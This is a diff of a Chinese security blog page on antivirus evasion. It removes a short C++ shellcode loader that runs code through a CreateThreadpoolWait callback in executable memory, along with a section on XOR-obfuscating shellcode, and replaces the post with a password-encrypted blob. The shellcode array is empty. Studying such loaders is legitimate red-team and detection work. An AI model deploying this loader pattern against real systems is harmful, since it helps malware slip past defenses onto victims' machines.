@@ -23,20 +23,18 @@
     var NexT = window.NexT || {};
     var CONFIG = {"hostname":"tingqiao.github.io","root":"/","images":"/images","scheme":"Pisces","version":"8.0.2","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
   </script>
-<meta name="description" content="CreateThreadpoolWait加载1234567891011121314151617#include &lt;windows.h&gt;#include &lt;threadpoolapiset.h&gt;int main()&amp;#123;    unsigned char shellcode[] &#x3D; &quot;&quot;;    HANDLE event &#x3D; CreateEvent(">
+<meta name="description" content="Here&#39;s something encrypted, password is required to continue reading.">
 <meta property="og:type" content="article">
 <meta property="og:title" content="CreateThreadpoolWait+XOR_免杀">
 <meta property="og:url" content="https://tingqiao.github.io/posts/e1cc05/index.html">
 <meta property="og:site_name" content="TingQiao&#39;s blog">
-<meta property="og:description" content="CreateThreadpoolWait加载1234567891011121314151617#include &lt;windows.h&gt;#include &lt;threadpoolapiset.h&gt;int main()&amp;#123;    unsigned char shellcode[] &#x3D; &quot;&quot;;    HANDLE event &#x3D; CreateEvent(">
+<meta property="og:description" content="Here&#39;s something encrypted, password is required to continue reading.">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://tingqiao.github.io/posts/e1cc05/res/2020-12-05-11-52-49.png">
 <meta property="article:published_time" content="2020-12-05T03:47:51.000Z">
-<meta property="article:modified_time" content="2020-12-05T03:58:51.758Z">
+<meta property="article:modified_time" content="2020-12-12T12:25:05.695Z">
 <meta property="article:author" content="听桥">
 <meta property="article:tag" content="内网渗透">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://tingqiao.github.io/posts/e1cc05/res/2020-12-05-11-52-49.png">
 
 
 <link rel="canonical" href="https://tingqiao.github.io/posts/e1cc05/">
@@ -174,7 +172,7 @@
 
   <aside class="sidebar">
 
-    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+    <div class="sidebar-inner sidebar-overview-active">
       <ul class="sidebar-nav">
         <li class="sidebar-nav-toc">
           文章目录
@@ -187,7 +185,6 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <section class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#CreateThreadpoolWait%E5%8A%A0%E8%BD%BD"><span class="nav-number">1.</span> <span class="nav-text">CreateThreadpoolWait加载</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XOR%E6%B7%B7%E6%B7%86shellcode%E5%90%8E%E5%85%8D%E6%9D%80%E6%95%88%E6%9E%9C"><span class="nav-number">2.</span> <span class="nav-text">XOR混淆shellcode后免杀效果</span></a></li></ol></div>
         </section>
         <!--/noindex-->
 
@@ -278,10 +275,16 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2020-12-05 11:47:51 / 修改时间：11:58:51" itemprop="dateCreated datePublished" datetime="2020-12-05T11:47:51+08:00">2020-12-05</time>
+      <time title="创建时间：2020-12-05 11:47:51" itemprop="dateCreated datePublished" datetime="2020-12-05T11:47:51+08:00">2020-12-05</time>
     </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2020-12-12 20:25:05" itemprop="dateModified" datetime="2020-12-12T20:25:05+08:00">2020-12-12</time>
+      </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
         <i class="far fa-folder"></i>
@@ -306,10 +309,15 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h2 id="CreateThreadpoolWait加载"><a href="#CreateThreadpoolWait加载" class="headerlink" title="CreateThreadpoolWait加载"></a>CreateThreadpoolWait加载</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;threadpoolapiset.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> shellcode[] = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    HANDLE event = CreateEvent(<span class="literal">NULL</span>, FALSE, TRUE, <span class="literal">NULL</span>);</span><br><span class="line">    LPVOID shellcodeAddress = VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    RtlMoveMemory(shellcodeAddress, shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line"></span><br><span class="line">    PTP_WAIT threadPoolWait = CreateThreadpoolWait((PTP_WAIT_CALLBACK)shellcodeAddress, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    SetThreadpoolWait(threadPoolWait, event, <span class="literal">NULL</span>);</span><br><span class="line">    WaitForSingleObject(event, INFINITE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="XOR混淆shellcode后免杀效果"><a href="#XOR混淆shellcode后免杀效果" class="headerlink" title="XOR混淆shellcode后免杀效果"></a>XOR混淆shellcode后免杀效果</h2><p><img src="/posts/e1cc05/res/2020-12-05-11-52-49.png" alt="XOR"></p>
-
+        <div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
+  <div class="hbe-input-container">
+  <input type="password" id="hbePass" placeholder="" />
+    <label for="hbePass">Hey, password is required here.</label>
+    <div class="bottom-line"></div>
+  </div>
+  <script id="hbeData" type="hbeData" data-hmacdigest="3b6fae5b85fd027b0c028ca98d4530054f4aa9dcfb6b05fbaa79e5a6148bb452">543ed5037945468f2f732ef918fa4444016a783e9e53312daebe166b66787c1a24ec33cdaccbee73d128232e9a2adc80fac8af8d782e00abe42ad9e7ab1b641adcdcf5a8a7f2b156c97a013293728556e45b6d791c2103e25ef5ef8c80302ca261ba642dbc47cd5a0c0238c938436a54b504bd98f20aa150a818f7a53785dc49f4c11f3ece07c2cd6ce7a9be21f6c23ecf212fa96c8f5f4fe6e46d42bacca8d6649d687eb7eec189f77a3aea0e661d4e48c3f310dfc41a62b73a6d897a497a673d054ddd8522ca2403851710d9e7f91d9b129cbb4d43c72215e34552323b901860fe9bfd75bb4df0e925e3d1450ad5ad6658491a558b32d51cfb19ec33b7c81185714ac8acd771e4c6d0dfefe98e3678352f411f99463f407d015b3922351d5d9aaf51210c1565fa4b9a7c8eb844e15ab72a38a4149353539a8c9cdd9899b0d3cb3dad174f7ae7bf89a0010c5ba609b75d1cc77289d35fc3a18836d9f15c1a3dfbbce2eac6c7a0365ce324b883a2faea673bfa7106cc6d109f3ad1ceb2ead3eb9ac65572c8a88283a34ee938dc5e59f8c1bf7efd3a059a339264e7d3a4b9728338ef74f4e4b53526b1ca78f435ee08ef4a4370c65d80ed804953bacf86bccd761f99251bf3763389bcb4a5e2c23f222a71298bf98205acc2913ae9c342eee98258f0ee25b8fb7cf1cf005172c91c42e79ff897c0777078a9c09e4ec3b2a55445d716570ced531925043aab0a018cbd28d38bab1280478ecd926923430a96ca19506821cbd5fd641aa92c77545fe01ca3bd9518baf17f138b58db74301414eeeddea202fbd0224dcf73d7be096ee5c37a68a77997f107975a66e3395389d2354d411bc96503c26103064cfd674101dc92286cd837639687ba82f2913173e71116e1dc8f329eafdb2505c357ace99ffefbb0be04ff0813dea83dda4dc45947755d3ef7d2a581b38a9175f8f58d70f87bf0f50e5579ba6074da45154d11af7dfc3be931a70f4472bf9fae104bc6c18ebc87db810284fb2401fb345c1dc93ded7370d65c601c159270a110e937bd70ef3eeea169c8879ce5e4663dce10f2e5a06518130743c7db9d825d1e5faaa9c50587136904ec620e40309d241280ce89def9159f036210a89ddec030ac6b0c823fbc8a1cbda381d99a39c7ef7ae28d5e544f4ff05603a2192a8b97b5bceeb55a57707fc063b3782465b35b357f126310305078490931cd0bfa766f2c5ddd34fd8cfe7ee4e116905674138d92a5defce68e052ae1a5114eb244854756a0895a658689cf3c1930b029a5ed0d1874abd3e04637b6abc7cd32a4a6070af646cdc7c10861ebd4d3616d732d7c1c607f8bdfef9ce3f890560ad499f2aa8099e6668f21e5ba07d74aa1714bd328044d76385849f00d503eaea277c0267be4eb6282bb67bed03cbf9e0a65beb892646a6c977d7e34f18500f552eeb7242d7087723d0638ef14d43fb5759cf853ffc06674959bd23b55335e3a3e635740e295224ce3914bcbc313f0e3cacdb6fbe7ba2db1750462c3f889fb1757e679603ca8b2ac9909948cd99429aaac9219830094cc0c11416c4502984454b6a084fad20d71a923bb11585bea297bb886ce04e84826b6130f0e9727d6bacfc755658e95397e6b578a4056cec14c47c32a76cb3f110d400fd9940f71eb740a910abd892187dd9e44da7d80fe2de7e6341f565a3ec47977f52e5877cfb10776f8f2bb5b59e0f5c1264fe22ea4d6209d8c3fb97bf7d979e90e4ea75200cee79a48b2837e3e16b0abee1da453af49c9e62bbe1bc3f36f85da1586fc7dc2b1912c9281bfd15458791cd7ccdfa6b2e3675b065f42c6be9dec628af053d45c7cf6d74518b7075a039c5bb30845bb6096e81f8d87c63ed922a53f818cf51883f04de3c5da8227c8b27823ef699be6d65927b35aa97b0012601fa76440585e41ef03097e20fa2a8af032f261a911ad1cf26b95b6b7f7e988e1fa90be5f669e18043e71ab57fc0370899e7958d997b2faeeaba26891ab36e6e08b8fe337366ad921f1384d51eed327d5f0918c67e0483339286c26ecb81568ec27ca898eebcf553af17e23026caf1cad23f454dbfd5cf20ed499c3b9ab208ec2d50359bbe2f454f2201edb49eeb550ea2703842168d589dda017b975a9e8eb56453f280ff9e3bf267477b4f2e76e80b0c3cee8e21fe40e3064a0e8fadcd353f4ba40a9c4b843fd369abb8a333823d10f60e28f79622f261485be62e1df3e8b3628691eb0b4043b748c626ea0274c129107c4357bcd61a52d55ddc5f18ec28fa522e12610a4b90265201ed17cc7770e1dc7a9e6d94335169547c03499eb22c5452fdafe60ee79b61b9852255c0566954d9947581bb38d5d491bcdd494996b4604a6948345616b8de1fbfb2f46f7a3c966773e94682a20452c946205e27903c26aaf644b54a361af476d10a416078e7fe8e55a4b2fc05457de0df5198055b34ed36ae749ff605ab183c14332481fa87437667d2ea31ff49c858bf9976b08e003b0ad1ae36aa0fcb73022b898c4f4ddbc9955272d4c4c46a7213b35e250536ce42a4f17fccc5facc85200a932078050f2258b4d03bdb7319f9347686a134ed02ecf92b6c93223186342b13f7d6206a3c3a246c0faf27915bdbfc706173e36c184b95938510b223ffea6da7c2eee61fe7d266fc6a1858f164072066814a925923fb4c58dcb7b0db1fc4e5c36c1971e1289b0b31d115c8e1822deec07a23deb1b348949e729ff76ad0cae4d1bfba17738a0ea191b895feb7aaa2daefa99340a0b02813658e18aac339e58717990969178831c5be0b159aee7eb1640e969ee16e5552d291fc91f29ee4c78e717afa194bd86cf7595558c6a42416c70b8249121014492d00e9a0fb435a5284a104b625bddc347d2e7c85210985d0bd6915f0173da3edfc2c3d910eb21950c58ba6b9c07c6da583bcc6c6342b8e06c46186af33495100de64feee3aa3e19ed938b39059733c551a13ca64f43320c92fd78c05ea9cff9dc80bad4cf66ccb7c7e062992fc806502e9f441c9156683f471a42e0b997a50c8e79dae967140100b665e100b97f72aa475557e43e07bac17aef7f7fbe19adea82e45c96d1fe13065d5743676afcd14cc4d46fc0dfcb20458bfb8d74d9a50010670e2bcf67a4f3ff3dd02547fe930bb19014090801fb6ecd1db97bce793dad9c9b8d8e3254c2cbd657b226fab1930d16361ed30141b58e149b56bf4db0f854ea09cf715b36993eedff6dba1a6368b3600d9b7f6689a7a7fa4dbcc10c119c01909effd411c41ca3c61826cbf58708107cf6e68b6c12e80ba102349e180329978574afea55205b4ef2d1792265d4b74e0b320a928337a26789a2ea4e460926f00305fc018f8cbfd0e53d6d1abfeca2e29dfb4c7b682447cfd78d60b4a5145f852582b3b9517399974c1bdbaabc73a4a8ae2f52443256662e55b35dac64210e2c284f57f47c1758b76f2d3eb0fa06bea2d35fd7d64514344901243f465d9a11c93a07cf2072d8f447dabbc97289a8b2556bd0bff5ed998b27db78c4b2c2ec94440dbef9e90fdbfd23473ccdd77c3bac1ef0073375c1be00f0fb1f5893740ed141ddfe916b4d74e42d17108f1fe301cc2dbaddf43104fdbe1a660e946c6936c29b71cc984aeded53360df747879b83b6412e60d5b6991e63dac349ddbb228b6719ecc1e761338fc85b926a649174c6dfb4a48cabdd9d2a831e6fc7f25f9bede67449a94339a3bd0f223c3d1395576453797fc0105444598b35e7a06878563c450fd72422a1bd19d07022cae42317f584edc66845f04eb863e0051b6372f063ddc0fc0a8c1b52d12c0bf6830c8bb01418da151e6f4aeff95be22aa25815ee6475bae81c692cb574035c4b9ac911f33a417fbb8a0920cb80428c3c7fa8571bbeb218eb63bf5b92a567c6e741a7caea8c52b95f85624d5b43e71b0362c94272abf6f603fac5b59a9868852e2625c8fb859b280fc1f053e17e04be9360fc38c5882909c5d2e8ec5289602eaa37b29a76eb2c76898e877166f45ca7b567e92318d101e4aed203b0c0e779f803aa29c867c3b40fb13716c1ce2d2aef0448</script>
+</div>
+<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">
     </div>
 
     
